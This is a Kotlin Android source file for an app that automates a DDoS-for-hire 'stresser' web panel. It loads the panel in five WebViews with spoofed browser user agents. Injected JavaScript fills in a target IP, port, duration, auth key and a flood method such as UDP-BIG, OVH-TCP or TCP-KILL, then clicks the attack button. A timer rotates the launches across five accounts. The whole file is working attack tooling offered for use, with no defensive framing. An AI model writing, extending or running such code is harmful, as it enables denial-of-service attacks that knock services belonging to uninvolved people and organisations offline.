package com.autoattack.app

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebSettings
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.viewpager2.widget.ViewPager2
import com.google.android.material.tabs.TabLayout
import com.google.android.material.tabs.TabLayoutMediator

class MainActivity : AppCompatActivity() {
    
    private lateinit var viewPager: ViewPager2
    private lateinit var tabLayout: TabLayout
    private lateinit var timerText: TextView
    private lateinit var startBtn: Button
    private lateinit var stopBtn: Button
    private lateinit var targetIpInput: EditText
    private lateinit var portInput: EditText
    private lateinit var durationInput: EditText
    private lateinit var authKeyInput: EditText
    private lateinit var methodSpinner: Spinner
    private lateinit var statusText: TextView
    
    private var rotationActive = false
    private var currentTab = 0
    private var handler = Handler(Looper.getMainLooper())
    private var currentSeconds = 30
    private var attackDuration = 30
    private var timerRunnable: Runnable? = null
    private var webViews = arrayOfNulls<WebView>(5)
    
    private val methods = arrayOf("UDP-BIG", "UDP-CUSTOM", "UDP-ZERO", "OVH-TCP", "CHAOS", "TCP-KILL")
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        initViews()
        setupSpinner()
        setupViewPager()
        loadSavedSettings()
    }
    
    private fun initViews() {
        viewPager = findViewById(R.id.viewPager)
        tabLayout = findViewById(R.id.tabLayout)
        timerText = findViewById(R.id.timerText)
        startBtn = findViewById(R.id.startBtn)
        stopBtn = findViewById(R.id.stopBtn)
        targetIpInput = findViewById(R.id.targetIpInput)
        portInput = findViewById(R.id.portInput)
        durationInput = findViewById(R.id.durationInput)
        authKeyInput = findViewById(R.id.authKeyInput)
        methodSpinner = findViewById(R.id.methodSpinner)
        statusText = findViewById(R.id.statusText)
        
        startBtn.setOnClickListener { startAutoAttack() }
        stopBtn.setOnClickListener { stopAutoAttack() }
    }
    
    private fun setupSpinner() {
        val adapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, methods)
        methodSpinner.adapter = adapter
    }
    
    private fun setupViewPager() {
        val adapter = WebViewPagerAdapter(this, 5)
        viewPager.adapter = adapter
        viewPager.isUserInputEnabled = false
        
        TabLayoutMediator(tabLayout, viewPager) { tab, position ->
            tab.text = "Account ${position + 1}"
        }.attach()
        
        handler.postDelayed({
            for (i in 0 until 5) {
                val webView = getWebViewAt(i)
                webView?.let { setupWebView(it, i) }
            }
        }, 1000)
    }
    
    private fun setupWebView(webView: WebView, index: Int) {
        val settings = webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        
        val userAgents = listOf(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/605.1.15"
        )
        settings.userAgentString = userAgents[index]
        
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                if (url?.contains("/panel") == true) {
                    autoFillForm(webView)
                }
            }
        }
        
        webView.loadUrl("https://retrostress.net/panel")
        webViews[index] = webView
    }
    
    private fun autoFillForm(webView: WebView) {
        val targetIp = targetIpInput.text.toString()
        val port = portInput.text.toString()
        val duration = durationInput.text.toString()
        val authKey = authKeyInput.text.toString()
        val method = methods[methodSpinner.selectedItemPosition]
        
        val jsCode = """
            (function() {
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    var ph = (inputs[i].placeholder || '').toLowerCase();
                    if(ph.includes('target') || ph.includes('ip')) {
                        inputs[i].value = '$targetIp';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(ph.includes('port')) {
                        inputs[i].value = '$port';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(ph.includes('duration')) {
                        inputs[i].value = '$duration';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(inputs[i].type === 'text' && !ph.includes('target') && !ph.includes('port')) {
                        inputs[i].value = '$authKey';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                }
                var select = document.querySelector('select');
                if(select) {
                    for(var i=0; i<select.options.length; i++) {
                        if(select.options[i].text.includes('$method')) {
                            select.selectedIndex = i;
                            select.dispatchEvent(new Event('change', {bubbles:true}));
                            break;
                        }
                    }
                }
            })();
        """.trimIndent()
        
        webView.evaluateJavascript(jsCode, null)
    }
    
    private fun executeAttack(webView: WebView) {
        val jsCode = """
            (function() {
                var btns = document.querySelectorAll('button');
                for(var i=0; i<btns.length; i++) {
                    var txt = (btns[i].innerText || '').toLowerCase();
                    if(txt.includes('execute') || txt.includes('attack') || txt.includes('start')) {
                        btns[i].click();
                        return 'clicked';
                    }
                }
                return 'no button';
            })();
        """.trimIndent()
        
        webView.evaluateJavascript(jsCode) { result ->
            if (result.contains("clicked")) {
                statusText.text = "✅ Attack sent from Account ${currentTab + 1}"
            }
        }
    }
    
    private fun startAutoAttack() {
        if (rotationActive) {
            statusText.text = "⚠️ Already running!"
            return
        }
        
        val authKey = authKeyInput.text.toString()
        if (authKey.isEmpty()) {
            statusText.text = "❌ Enter Auth Key first!"
            return
        }
        
        rotationActive = true
        currentTab = 0
        attackDuration = durationInput.text.toString().toIntOrNull() ?: 30
        currentSeconds = attackDuration
        
        statusText.text = "🟢 Auto attack started! Rotating every ${attackDuration} seconds"
        startRotation()
    }
    
    private fun startRotation() {
        if (timerRunnable != null) handler.removeCallbacks(timerRunnable!!)
        
        timerRunnable = object : Runnable {
            override fun run() {
                if (!rotationActive) return
                
                if (currentSeconds > 0) {
                    currentSeconds--
                    val mins = currentSeconds / 60
                    val secs = currentSeconds % 60
                    timerText.text = String.format("%02d:%02d", mins, secs)
                    
                    if (currentSeconds <= 5) {
                        timerText.setTextColor(0xFFFF0000.toInt())
                    } else {
                        timerText.setTextColor(0xFF00FF00.toInt())
                    }
                    
                    handler.postDelayed(this, 1000)
                } else {
                    val webView = webViews[currentTab]
                    if (webView != null) {
                        viewPager.setCurrentItem(currentTab, true)
                        autoFillForm(webView)
                        handler.postDelayed({
                            executeAttack(webView)
                        }, 500)
                    }
                    
                    statusText.text = "🔴 Attacking Account ${currentTab + 1}"
                    
                    currentTab = (currentTab + 1) % 5
                    currentSeconds = attackDuration
                    
                    handler.postDelayed(this, 1000)
                }
            }
        }
        handler.post(timerRunnable!!)
    }
    
    private fun stopAutoAttack() {
        rotationActive = false
        if (timerRunnable != null) {
            handler.removeCallbacks(timerRunnable!!)
            timerRunnable = null
        }
        timerText.text = "00:00"
        statusText.text = "⏹ Stopped"
    }
    
    private fun getWebViewAt(position: Int): WebView? = webViews[position]
    
    fun registerWebView(position: Int, webView: WebView) {
        webViews[position] = webView
    }
    
    private fun loadSavedSettings() {
        val prefs = getSharedPreferences("settings", MODE_PRIVATE)
        targetIpInput.setText(prefs.getString("target_ip", "127.0.0.1"))
        portInput.setText(prefs.getString("port", "80"))
        durationInput.setText(prefs.getString("duration", "30"))
        authKeyInput.setText(prefs.getString("auth_key", ""))
        methodSpinner.setSelection(prefs.getInt("method", 0))
    }
    
    override fun onPause() {
        super.onPause()
        val prefs = getSharedPreferences("settings", MODE_PRIVATE)
        prefs.edit().apply {
            putString("target_ip", targetIpInput.text.toString())
            putString("port", portInput.text.toString())
            putString("duration", durationInput.text.toString())
            putString("auth_key", authKeyInput.text.toString())
            putInt("method", methodSpinner.selectedItemPosition)
            apply()
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopAutoAttack()
    }
}
